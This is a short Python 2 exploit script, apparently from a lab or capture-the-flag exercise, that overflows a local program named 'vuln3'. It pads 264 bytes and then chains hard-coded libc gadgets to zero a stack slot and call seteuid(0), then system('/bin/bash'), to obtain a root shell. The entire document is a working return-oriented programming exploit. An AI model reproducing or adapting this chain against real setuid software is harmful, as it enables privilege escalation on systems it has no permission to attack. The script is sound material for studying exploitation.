#!/usr/bin/env python2
import struct
import subprocess

# base
libc = 0xb7c00000

#part 1
pop_ebx_addr = 0xB7D0A4E8                   # libc + 0x0010a4e8 : push esp; pop ebx; pop esi; ret;
xchg_eax_addr = 0xB7D91FD6		    # libc + 0x00191fd6 : xchg ebx, eax; add al, 0x83; ret;
fix_eax_addr = 0xB7D62973                   # libc + 0x00162973 : sub al, 0x83; ret;
add_eax_addr = 0xB7D3E1EA                   # libc + 0x0013e1ea : add eax, 0xc; ret;
mov_eax_addr = 0xB7C39A9A                   # libc + 0x00039a9a : mov dword ptr [eax], 0; xor eax, eax; ret;
#part 2
seteuid_addr = 0xB7D18410                   # libc + 0x00118410
pop_ret_addr = 0xB7D27CE1                   # libc + 0x00127ce1
# part 3
system_addr = 0xb7c4c805
exit_addr =   0xb7c3bc90
bash_addr =   0xb7db5faa

# JUNK + ROP + seteuid + call_bash
buf = "A" * 264
#part 1
buf += struct.pack("<I",pop_ebx_addr)      # load ebx with esp and pop off dummy
buf += "LALA"                              # just a filler to be popped
buf += struct.pack("<I",xchg_eax_addr)     # put ebx into eax but al got altered 
buf += struct.pack("<I",fix_eax_addr)      # fix eax
buf += struct.pack("<I",add_eax_addr)      # need to add 36 to eax so, 3 times 0xc
buf += struct.pack("<I",add_eax_addr)
buf += struct.pack("<I",add_eax_addr)
buf += struct.pack("<I",mov_eax_addr)      # now put 0 into [eax]
#part 2
buf += struct.pack("<I",seteuid_addr)
buf += struct.pack("<I",pop_ret_addr)      # pop the arg out
buf += "LALA"                              # eax has put 0 here now
#part 3
buf += struct.pack("<I",system_addr)       # call to system
buf += struct.pack("<I",exit_addr)         # call to exit for graceful exit
buf += struct.pack("<I",bash_addr)         # /bin/bash argument
#print buf
subprocess.call(["./vuln3", buf])
